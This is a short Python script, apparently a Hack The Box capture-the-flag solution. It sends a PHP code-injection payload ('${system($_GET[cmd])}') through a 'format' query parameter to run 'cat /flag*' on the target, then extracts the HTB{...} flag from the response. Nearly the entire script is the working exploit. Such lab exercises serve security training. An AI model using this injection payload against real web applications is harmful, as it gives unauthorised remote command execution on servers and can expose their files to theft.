import requests
import re

host, port = "94.237.48.12", 59743

url = f"http://{host}:{port}"
url_format = f"http://{host}:{port}/?format="

payload = '${system($_GET[cmd])}'

params = {
    "format": payload,
    "cmd": "cat /flag*"
}

response = requests.get(url_format,params=params)

flag = re.search(r'HTB\{.*?\}',response.text)

print(flag.group())